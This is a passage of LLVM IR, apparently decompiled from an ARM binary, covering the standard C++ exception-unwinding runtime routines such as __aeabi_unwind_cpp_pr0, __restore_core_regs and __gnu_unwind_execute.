  uselistorder i1 false, { 0, 1, 2, 42, 18, 19, 16, 20, 54, 55, 56, 57, 58, 59, 13, 14, 17, 60, 61, 62, 15, 43, 38, 44, 45, 46, 47, 48, 7, 21, 22, 39, 5, 33, 63, 3, 49, 50, 51, 52, 53, 35, 6, 9, 64, 23, 10, 24, 40, 41, 26, 27, 25, 30, 29, 28, 31, 11, 12, 4, 32, 8, 37, 34, 36, 65, 66, 67, 68 }
  uselistorder i1* @cpsr_z, { 0, 1, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 55, 21, 22, 23, 24, 25, 26, 27, 28, 51, 52, 53, 54, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 50 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_229bc = load i32, i32* @r1, align 4
  %v2_229bc = load i32, i32* @r2, align 4
  %v4_229bc = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_229bc, i32 %v2_229bc, i32 2)
  ret i32 %v4_229bc
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_229c4 = load i32, i32* @r1, align 4
  %v2_229c4 = load i32, i32* @r2, align 4
  %v4_229c4 = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_229c4, i32 %v2_229c4, i32 1)
  ret i32 %v4_229c4
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_229cc = load i32, i32* @r1, align 4
  %v2_229cc = load i32, i32* @r2, align 4
  %v4_229cc = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_229cc, i32 %v2_229cc, i32 0)
  ret i32 %v4_229cc

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 18, 19, 20, 179, 25, 74, 75, 76, 77, 3, 78, 79, 80, 81, 82, 83, 15, 84, 85, 86, 89, 21, 90, 91, 92, 93, 94, 113, 114, 118, 119, 120, 121, 100, 22, 122, 123, 32, 33, 34, 35, 180, 181, 97, 98, 4, 87, 88, 124, 125, 126, 46, 23, 14, 182, 183, 184, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 101, 5, 102, 103, 6, 104, 105, 106, 107, 108, 109, 110, 111, 2, 156, 112, 24, 164, 165, 166, 185, 186, 187, 198, 199, 200, 201, 190, 7, 191, 188, 189, 65, 66, 8, 67, 68, 95, 96, 9, 169, 170, 171, 10, 172, 173, 174, 11, 167, 168, 175, 12, 176, 115, 116, 117, 53, 54, 55, 157, 158, 47, 141, 142, 143, 144, 99, 202, 209, 210, 203, 204, 205, 206, 207, 208, 0, 1, 211, 13, 16, 145, 146, 147, 149, 148, 150, 151, 152, 153, 154, 155, 60, 61, 62, 57, 159, 160, 161, 39, 40, 192, 193, 194, 195, 196, 197, 36, 37, 38, 41, 42, 43, 44, 45, 48, 49, 50, 51, 52, 56, 58, 59, 26, 27, 28, 29, 30, 31, 63, 64, 69, 70, 71, 72, 73, 17, 162, 163, 177, 178 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_229d4 = add i32 %tmp, 56
  %v4_229d4 = inttoptr i32 %v3_229d4 to i32*
  %v5_229d4 = load i32, i32* %v4_229d4, align 4
  %v6_229d4 = add i32 %tmp, 60
  %v7_229d4 = inttoptr i32 %v6_229d4 to i32*
  %v8_229d4 = load i32, i32* %v7_229d4, align 4
  %v2_229e0 = load i32, i32* %arg1, align 4
  %v3_229e0 = add i32 %tmp, 4
  %v4_229e0 = inttoptr i32 %v3_229e0 to i32*
  %v5_229e0 = load i32, i32* %v4_229e0, align 4
  store i32 %v5_229e0, i32* @r1, align 4
  %v12_229e0 = add i32 %tmp, 16
  %v13_229e0 = inttoptr i32 %v12_229e0 to i32*
  %v14_229e0 = load i32, i32* %v13_229e0, align 4
  store i32 %v14_229e0, i32* @r4, align 4
  %v15_229e0 = add i32 %tmp, 20
  %v16_229e0 = inttoptr i32 %v15_229e0 to i32*
  %v17_229e0 = load i32, i32* %v16_229e0, align 4
  store i32 %v17_229e0, i32* @r5, align 4
  %v18_229e0 = add i32 %tmp, 24
  %v19_229e0 = inttoptr i32 %v18_229e0 to i32*
  %v20_229e0 = load i32, i32* %v19_229e0, align 4
  store i32 %v20_229e0, i32* @r6, align 4
  %v21_229e0 = add i32 %tmp, 28
  %v22_229e0 = inttoptr i32 %v21_229e0 to i32*
  %v23_229e0 = load i32, i32* %v22_229e0, align 4
  store i32 %v23_229e0, i32* @r7, align 4
  %v24_229e0 = add i32 %tmp, 32
  %v25_229e0 = inttoptr i32 %v24_229e0 to i32*
  %v26_229e0 = load i32, i32* %v25_229e0, align 4
  store i32 %v26_229e0, i32* @r8, align 4
  %v27_229e0 = add i32 %tmp, 36
  %v28_229e0 = inttoptr i32 %v27_229e0 to i32*
  %v29_229e0 = load i32, i32* %v28_229e0, align 4
  store i32 %v29_229e0, i32* @sb, align 4
  %v30_229e0 = add i32 %tmp, 40
  %v31_229e0 = inttoptr i32 %v30_229e0 to i32*
  %v32_229e0 = load i32, i32* %v31_229e0, align 4
  store i32 %v32_229e0, i32* @sl, align 4
  store i32 %v8_229d4, i32* @ip, align 4
  store i32 %v5_229d4, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_229d4)
  ret i32 %v2_229e0

; uselistorder directives
  uselistorder i32 %v8_229d4, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 152, 153, 154, 155, 27, 17, 18, 19, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 73, 12, 78, 79, 80, 81, 83, 84, 82, 85, 5, 86, 6, 87, 88, 89, 90, 91, 20, 21, 13, 7, 158, 156, 157, 67, 68, 69, 70, 71, 72, 46, 92, 93, 107, 134, 135, 42, 11, 43, 109, 108, 1, 110, 111, 2, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 8, 173, 174, 175, 176, 177, 178, 179, 180, 181, 112, 76, 77, 113, 114, 115, 182, 0, 185, 136, 137, 150, 151, 183, 184, 139, 140, 14, 141, 142, 143, 144, 9, 145, 146, 147, 148, 149, 15, 131, 132, 10, 133, 74, 75, 116, 118, 117, 3, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 159, 189, 186, 187, 188, 4, 190, 120, 121, 122, 123, 124, 125, 126, 127, 119, 128, 129, 130, 26, 138, 22, 23, 24, 25, 16 }
  uselistorder i32 40, { 25, 21, 22, 23, 24, 3, 9, 10, 13, 14, 6, 26, 4, 15, 1, 12, 5, 2, 11, 0, 16, 17, 18, 19, 20, 7, 8 }
  uselistorder i32* @sb, { 78, 11, 12, 13, 14, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 42, 30, 31, 32, 1, 33, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 4, 5, 6, 79, 80, 34, 35, 36, 37, 38, 39, 40, 41, 54, 55, 56, 57, 58, 59, 60, 15, 16, 17, 18, 7, 8, 81, 73, 76, 74, 75, 77, 2, 9, 10, 71, 72, 61, 62, 63, 64, 65, 66, 67, 0, 68, 69, 70, 3 }
  uselistorder i32 36, { 26, 6, 25, 4, 14, 15, 18, 19, 20, 21, 22, 16, 8, 12, 9, 27, 0, 1, 2, 5, 17, 10, 3, 23, 24, 7, 13, 11 }
  uselistorder i32* @r8, { 174, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 3, 173, 9, 44, 45, 46, 47, 48, 49, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 71, 77, 91, 92, 93, 94, 95, 96, 4, 97, 98, 99, 100, 101, 102, 20, 21, 22, 175, 176, 72, 73, 5, 74, 75, 76, 103, 104, 105, 106, 107, 108, 109, 110, 10, 78, 79, 80, 81, 11, 82, 83, 84, 85, 86, 87, 88, 89, 90, 111, 0, 112, 113, 65, 6, 66, 67, 68, 69, 70, 50, 51, 52, 53, 23, 24, 25, 12, 35, 36, 37, 38, 39, 13, 26, 27, 28, 14, 15, 7, 16, 139, 140, 141, 142, 143, 8, 144, 145, 146, 147, 148, 149, 150, 151, 40, 41, 42, 43, 152, 153, 154, 155, 131, 132, 133, 134, 129, 130, 114, 115, 116, 117, 118, 119, 120, 2, 121, 1, 122, 123, 124, 125, 17, 18, 126, 127, 128, 135, 136, 137, 138, 29, 30, 31, 32, 33, 34, 19 }
  uselistorder i32 32, { 122, 119, 120, 121, 77, 78, 79, 80, 41, 42, 50, 67, 68, 44, 45, 81, 43, 51, 82, 83, 84, 85, 48, 86, 87, 89, 90, 101, 102, 56, 103, 91, 92, 69, 70, 123, 66, 124, 40, 65, 125, 27, 95, 96, 88, 116, 52, 46, 99, 97, 98, 104, 57, 29, 105, 106, 100, 58, 93, 94, 59, 1, 2, 4, 3, 117, 6, 5, 8, 7, 10, 9, 47, 107, 108, 28, 109, 0, 60, 110, 111, 112, 113, 114, 115, 30, 71, 72, 118, 61, 62, 12, 11, 32, 14, 13, 31, 16, 15, 33, 49, 73, 74, 75, 18, 17, 34, 20, 19, 35, 53, 63, 76, 36, 22, 21, 24, 23, 37, 38, 26, 25, 39, 54, 55, 64 }
  uselistorder i32 28, { 70, 42, 7, 10, 44, 8, 47, 9, 48, 53, 55, 56, 11, 57, 12, 54, 13, 14, 49, 58, 43, 15, 31, 16, 71, 32, 72, 73, 74, 75, 45, 46, 41, 59, 17, 60, 1, 50, 51, 61, 52, 18, 4, 19, 33, 20, 2, 34, 3, 62, 63, 64, 65, 66, 67, 68, 0, 69, 35, 36, 37, 5, 6, 38, 27, 26, 23, 24, 25, 30, 28, 29, 21, 39, 22, 40 }
  uselistorder i32 24, { 62, 61, 4, 12, 32, 36, 38, 39, 0, 49, 5, 50, 40, 41, 16, 17, 63, 13, 14, 64, 42, 43, 37, 51, 1, 47, 44, 45, 46, 33, 34, 52, 48, 15, 35, 18, 19, 20, 21, 22, 31, 2, 53, 54, 55, 56, 57, 58, 59, 60, 23, 24, 25, 26, 27, 28, 29, 9, 10, 8, 11, 3, 6, 7, 30 }
  uselistorder i32 20, { 79, 77, 78, 80, 2, 6, 61, 62, 3, 8, 10, 67, 0, 70, 63, 64, 33, 34, 81, 35, 82, 83, 84, 65, 66, 12, 60, 13, 85, 11, 86, 4, 87, 68, 14, 71, 72, 69, 57, 58, 59, 36, 15, 16, 37, 38, 1, 17, 18, 88, 19, 47, 50, 51, 52, 53, 54, 55, 56, 20, 21, 22, 23, 24, 25, 26, 28, 29, 27, 30, 5, 7, 73, 74, 75, 76, 39, 40, 41, 42, 43, 44, 45, 46, 9, 31, 48, 32, 49 }
  uselistorder i32* @r1, { 303, 26, 27, 28, 4, 304, 128, 129, 19, 130, 131, 132, 133, 134, 29, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 68, 69, 30, 70, 71, 146, 5, 147, 148, 149, 150, 151, 152, 153, 18, 154, 155, 156, 157, 158, 31, 159, 160, 161, 175, 32, 33, 39, 176, 305, 177, 178, 179, 180, 181, 182, 183, 187, 188, 189, 190, 191, 194, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 232, 233, 6, 234, 235, 236, 237, 15, 72, 73, 238, 240, 239, 34, 241, 242, 243, 244, 245, 246, 195, 196, 247, 76, 78, 74, 2, 307, 75, 306, 192, 193, 7, 172, 173, 248, 249, 255, 256, 257, 292, 35, 107, 36, 162, 1, 163, 164, 37, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 8, 330, 331, 38, 41, 197, 198, 199, 200, 201, 202, 203, 165, 166, 167, 168, 169, 170, 258, 259, 260, 261, 262, 263, 264, 265, 266, 268, 269, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 217, 218, 219, 280, 184, 42, 174, 3, 171, 43, 77, 79, 120, 332, 44, 335, 336, 337, 338, 293, 294, 52, 302, 45, 334, 46, 53, 121, 122, 297, 67, 333, 185, 186, 298, 9, 299, 10, 300, 296, 80, 47, 301, 231, 281, 54, 285, 11, 282, 283, 284, 214, 215, 216, 48, 270, 271, 272, 49, 288, 50, 250, 251, 252, 253, 254, 12, 289, 290, 16, 310, 51, 13, 55, 56, 57, 58, 59, 60, 61, 14, 341, 342, 343, 344, 0, 345, 20, 40, 273, 274, 275, 17, 276, 277, 278, 21, 279, 267, 123, 124, 125, 287, 22, 339, 340, 308, 309, 23, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 62, 63, 64, 65, 66, 126, 127, 286, 291, 295, 24, 25 }
  uselistorder i32 60, { 2, 24, 25, 26, 20, 21, 3, 1, 4, 16, 17, 18, 19, 12, 13, 5, 14, 15, 6, 0, 22, 23, 7, 9, 10, 8, 11 }
  uselistorder i32 56, { 3, 35, 36, 1, 29, 30, 31, 15, 16, 7, 8, 21, 22, 23, 24, 25, 26, 27, 12, 13, 14, 6, 28, 17, 18, 19, 20, 0, 4, 32, 33, 34, 10, 9, 2, 11, 5 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_229f0 = load i32, i32* @r0, align 4
  ret i32 %v1_229f0
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_229f8 = load i32, i32* @r0, align 4
  ret i32 %v1_229f8
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22a0c = ptrtoint i32* %stack_var_-68 to i32
  %v2_22a10 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_22a0c, i32 0)
  ret i32 %v2_22a10

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22a30 = ptrtoint i32* %stack_var_-68 to i32
  %v2_22a34 = call i32 @__gnu_Unwind_Resume(i32 %v2_22a30, i32 0)
  ret i32 %v2_22a34

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22a54 = ptrtoint i32* %stack_var_-68 to i32
  %v2_22a58 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_22a54, i32 0)
  ret i32 %v2_22a58

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_22a78 = ptrtoint i32* %stack_var_-68 to i32
  %v6_22a7c = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_22a78, i32 %arg2, i8* %arg3, i32 %v2_22a78)
  ret i32 %v6_22a7c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_22aa8 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_22ab0 = add i32 %tmp1, 76
  %v2_22ab0 = inttoptr i32 %v1_22ab0 to i32*
  %v3_22ab0 = load i32, i32* %v2_22ab0, align 4
  %v1_22ab4 = add i32 %v3_22ab0, 7
  %v2_22ab4 = inttoptr i32 %v1_22ab4 to i8*
  %v3_22ab4 = load i8, i8* %v2_22ab4, align 1
  %v4_22ab4 = zext i8 %v3_22ab4 to i32
  %v1_22ab8 = add i32 %v3_22ab0, 8
  %v3_22abc = mul nuw nsw i32 %v4_22ab4, 4
  %v2_22ac0 = add i32 %v3_22abc, %v1_22ab8
  %v3_22ac0 = inttoptr i32 %v2_22ac0 to i8*
  ret i8* %v3_22ac0
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_22ad0 = load i32, i32* @r6, align 4
  %v21_22ad0 = load i32, i32* @lr, align 4
  %v0_22ad4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22ad4, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_22ae4

dec_label_pc_22ae4:                               ; preds = %dec_label_pc_22ae4.backedge, %entry
  %v3_22af0 = phi i32 [ %v0_22ae4.pre, %dec_label_pc_22ae4.backedge ], [ %tmp, %entry ]
  %v1_22ae4 = add i32 %v3_22af0, 8
  %v2_22ae4 = inttoptr i32 %v1_22ae4 to i8*
  %v3_22ae4 = load i8, i8* %v2_22ae4, align 1
  %v4_22ae4 = zext i8 %v3_22ae4 to i32
  store i32 %v4_22ae4, i32* %r3.global-to-local, align 4
  %v2_22ae8 = icmp eq i8 %v3_22ae4, 0
  store i1 %v2_22ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22ae8, label %dec_label_pc_22af8, label %.thread

.thread:                                          ; preds = %dec_label_pc_22ae4
  %v2_22aec = add nsw i32 %v4_22ae4, -1
  store i32 %v2_22aec, i32* %r3.global-to-local, align 4
  %v2_22af0 = trunc i32 %v2_22aec to i8
  store i8 %v2_22af0, i8* %v2_22ae4, align 1
  %v0_22af4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22af4.pr.pr, label %.thread.dec_label_pc_22af8_crit_edge, label %dec_label_pc_22b20

.thread.dec_label_pc_22af8_crit_edge:             ; preds = %.thread
  %v0_22af8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22af8

dec_label_pc_22af8:                               ; preds = %.thread.dec_label_pc_22af8_crit_edge, %dec_label_pc_22ae4
  %v0_22af8 = phi i32 [ %v0_22af8.pre, %.thread.dec_label_pc_22af8_crit_edge ], [ %v3_22af0, %dec_label_pc_22ae4 ]
  %v1_22af8 = add i32 %v0_22af8, 9
  %v2_22af8 = inttoptr i32 %v1_22af8 to i8*
  %v3_22af8 = load i8, i8* %v2_22af8, align 1
  %v4_22af8 = zext i8 %v3_22af8 to i32
  store i32 %v4_22af8, i32* %r3.global-to-local, align 4
  %v2_22afc = icmp eq i8 %v3_22af8, 0
  store i1 %v2_22afc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22afc, label %dec_label_pc_22c00, label %dec_label_pc_22b04

dec_label_pc_22b04:                               ; preds = %dec_label_pc_22bf4, %dec_label_pc_22af8
  %v2_22b08 = phi i32 [ %v0_22bf4, %dec_label_pc_22bf4 ], [ %v0_22af8, %dec_label_pc_22af8 ]
  %v0_22b04 = phi i32 [ %v4_22bf4, %dec_label_pc_22bf4 ], [ %v4_22af8, %dec_label_pc_22af8 ]
  %v1_22b04 = add nsw i32 %v0_22b04, -1
  store i32 %v1_22b04, i32* %r3.global-to-local, align 4
  %v1_22b08 = trunc i32 %v1_22b04 to i8
  %v3_22b08 = add i32 %v2_22b08, 9
  %v4_22b08 = inttoptr i32 %v3_22b08 to i8*
  store i8 %v1_22b08, i8* %v4_22b08, align 1
  %v0_22b0c = load i32, i32* @r5, align 4
  %v1_22b0c = add i32 %v0_22b0c, 4
  %v2_22b0c = inttoptr i32 %v1_22b0c to i32*
  %v3_22b0c = load i32, i32* %v2_22b0c, align 4
  store i32 %v3_22b0c, i32* %r2.global-to-local, align 4
  %v1_22b10 = inttoptr i32 %v3_22b0c to i32*
  %v2_22b10 = load i32, i32* %v1_22b10, align 4
  store i32 %v2_22b10, i32* %r0.global-to-local, align 4
  %v4_22b10 = add i32 %v3_22b0c, 4
  store i32 %v4_22b10, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_22b18 = inttoptr i32 %v0_22b0c to i32*
  store i32 %v2_22b10, i32* %v1_22b18, align 4
  %v5_22b18 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_22b18, i32* %v2_22b0c, align 4
  %v0_22b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_22b1c = trunc i32 %v0_22b1c to i8
  %v2_22b1c = load i32, i32* @r5, align 4
  %v3_22b1c = add i32 %v2_22b1c, 8
  %v4_22b1c = inttoptr i32 %v3_22b1c to i8*
  store i8 %v1_22b1c, i8* %v4_22b1c, align 1
  br label %dec_label_pc_22b20

dec_label_pc_22b20:                               ; preds = %.thread, %dec_label_pc_22b04, %.thread6
  %v0_22b20 = load i32, i32* @r5, align 4
  %v1_22b20 = inttoptr i32 %v0_22b20 to i32*
  %v2_22b20 = load i32, i32* %v1_22b20, align 4
  %v3_22b24 = udiv i32 %v2_22b20, 16777216
  store i32 %v3_22b24, i32* @r4, align 4
  store i32 %v3_22b24, i32* %ip.global-to-local, align 4
  %v3_22b2c = mul i32 %v2_22b20, 256
  store i32 %v3_22b2c, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_22b20, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_22b2c, i32* %v1_22b20, align 4
  br i1 %tmp183, label %dec_label_pc_22c00, label %dec_label_pc_22b3c

dec_label_pc_22b3c:                               ; preds = %dec_label_pc_22b20
  %v0_22b3c = load i32, i32* @r4, align 4
  %v1_22b3c = and i32 %v0_22b3c, 128
  store i32 %v1_22b3c, i32* %r1.global-to-local, align 4
  %v2_22b3c = icmp eq i32 %v1_22b3c, 0
  store i1 %v2_22b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b3c, label %dec_label_pc_22c18, label %dec_label_pc_22b44

dec_label_pc_22b44:                               ; preds = %dec_label_pc_22b3c
  %v1_22b44 = and i32 %v0_22b3c, 240
  store i32 %v1_22b44, i32* @r6, align 4
  %v7_22b48 = icmp eq i32 %v1_22b44, 128
  store i1 %v7_22b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22b48, label %dec_label_pc_22b50, label %dec_label_pc_22c74

dec_label_pc_22b50:                               ; preds = %dec_label_pc_22b44
  %v0_22b50 = load i32, i32* @r5, align 4
  %v1_22b50 = add i32 %v0_22b50, 8
  %v2_22b50 = inttoptr i32 %v1_22b50 to i8*
  %v3_22b50 = load i8, i8* %v2_22b50, align 1
  %v4_22b50 = zext i8 %v3_22b50 to i32
  store i32 %v4_22b50, i32* %r3.global-to-local, align 4
  %v2_22b54 = icmp eq i8 %v3_22b50, 0
  store i1 %v2_22b54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b54, label %dec_label_pc_22b64, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_22b50
  %v2_22b58 = add nsw i32 %v4_22b50, -1
  store i32 %v2_22b58, i32* %r3.global-to-local, align 4
  %v2_22b5c = trunc i32 %v2_22b58 to i8
  store i8 %v2_22b5c, i8* %v2_22b50, align 1
  %v0_22b60.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22b60.pr.pr, label %.thread3.dec_label_pc_22b64_crit_edge, label %dec_label_pc_22b94

.thread3.dec_label_pc_22b64_crit_edge:            ; preds = %.thread3
  %v0_22b64.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22b64

dec_label_pc_22b64:                               ; preds = %.thread3.dec_label_pc_22b64_crit_edge, %dec_label_pc_22b50
  %v2_22b78 = phi i32 [ %v0_22b64.pre, %.thread3.dec_label_pc_22b64_crit_edge ], [ %v0_22b50, %dec_label_pc_22b50 ]
  %v1_22b64 = add i32 %v2_22b78, 9
  %v2_22b64 = inttoptr i32 %v1_22b64 to i8*
  %v3_22b64 = load i8, i8* %v2_22b64, align 1
  %v4_22b64 = zext i8 %v3_22b64 to i32
  store i32 %v4_22b64, i32* %r3.global-to-local, align 4
  %v2_22b68 = icmp eq i8 %v3_22b64, 0
  store i1 %v2_22b68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22b68, label %dec_label_pc_22ba4, label %dec_label_pc_22b74

dec_label_pc_22b74:                               ; preds = %dec_label_pc_22b64
  %v1_22b74 = add nsw i32 %v4_22b64, -1
  store i32 %v1_22b74, i32* %r3.global-to-local, align 4
  %v1_22b78 = trunc i32 %v1_22b74 to i8
  store i8 %v1_22b78, i8* %v2_22b64, align 1
  %v0_22b7c = load i32, i32* @r5, align 4
  %v1_22b7c = add i32 %v0_22b7c, 4
  %v2_22b7c = inttoptr i32 %v1_22b7c to i32*
  %v3_22b7c = load i32, i32* %v2_22b7c, align 4
  store i32 %v3_22b7c, i32* %r2.global-to-local, align 4
  %v1_22b80 = inttoptr i32 %v3_22b7c to i32*
  %v2_22b80 = load i32, i32* %v1_22b80, align 4
  store i32 %v2_22b80, i32* %r0.global-to-local, align 4
  %v4_22b80 = add i32 %v3_22b7c, 4
  store i32 %v4_22b80, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22b80, i32* %v2_22b7c, align 4
  %v0_22b8c = load i32, i32* %r3.global-to-local, align 4
  %v1_22b8c = trunc i32 %v0_22b8c to i8
  %v2_22b8c = load i32, i32* @r5, align 4
  %v3_22b8c = add i32 %v2_22b8c, 8
  %v4_22b8c = inttoptr i32 %v3_22b8c to i8*
  store i8 %v1_22b8c, i8* %v4_22b8c, align 1
  %v0_22b90 = load i32, i32* %r0.global-to-local, align 4
  %v1_22b90 = load i32, i32* @r5, align 4
  %v2_22b90 = inttoptr i32 %v1_22b90 to i32*
  store i32 %v0_22b90, i32* %v2_22b90, align 4
  br label %dec_label_pc_22b94

dec_label_pc_22b94:                               ; preds = %.thread3, %dec_label_pc_22b74
  %v0_22b94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22b94, i32* %r3.global-to-local, align 4
  %v3_22b98 = mul i32 %v0_22b94, 256
  store i32 %v3_22b98, i32* %r0.global-to-local, align 4
  %v1_22b9c = load i32, i32* @r5, align 4
  %v2_22b9c = inttoptr i32 %v1_22b9c to i32*
  store i32 %v3_22b98, i32* %v2_22b9c, align 4
  %v0_22ba0 = load i32, i32* %r3.global-to-local, align 4
  %v3_22ba0 = udiv i32 %v0_22ba0, 16777216
  br label %dec_label_pc_22ba4

dec_label_pc_22ba4:                               ; preds = %dec_label_pc_22b64, %dec_label_pc_22b94
  %storemerge133 = phi i32 [ %v3_22ba0, %dec_label_pc_22b94 ], [ 176, %dec_label_pc_22b64 ]
  %v1_22ba4 = load i32, i32* %ip.global-to-local, align 4
  %v4_22ba4 = mul i32 %v1_22ba4, 256
  %v5_22ba4 = or i32 %v4_22ba4, %storemerge133
  store i32 %v5_22ba4, i32* %r2.global-to-local, align 4
  %v7_22ba8 = icmp eq i32 %v5_22ba4, 32768
  store i1 %v7_22ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_22ba8, label %dec_label_pc_22db4, label %dec_label_pc_22bb0

dec_label_pc_22bb0:                               ; preds = %dec_label_pc_22ba4
  %v3_22bb0 = mul i32 %v5_22ba4, 16
  store i32 %v3_22bb0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_22bc0 = and i32 %v3_22bb0, 65520
  store i32 %v3_22bc0, i32* %r2.global-to-local, align 4
  %v0_22bc4 = load i32, i32* @r7, align 4
  store i32 %v0_22bc4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_22bcc = call i32 @_Unwind_VRS_Pop(i32 %v0_22bc4, i32 %v3_22bc0, i32 0, i32 0)
  store i32 %v4_22bcc, i32* %r0.global-to-local, align 4
  %v2_22bd0 = icmp eq i32 %v4_22bcc, 0
  store i1 %v2_22bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22bd0, label %dec_label_pc_22bd8, label %dec_label_pc_22db4

dec_label_pc_22bd8:                               ; preds = %dec_label_pc_22bb0
  %v0_22bd8 = load i32, i32* @r5, align 4
  %v1_22bd8 = add i32 %v0_22bd8, 8
  %v2_22bd8 = inttoptr i32 %v1_22bd8 to i8*
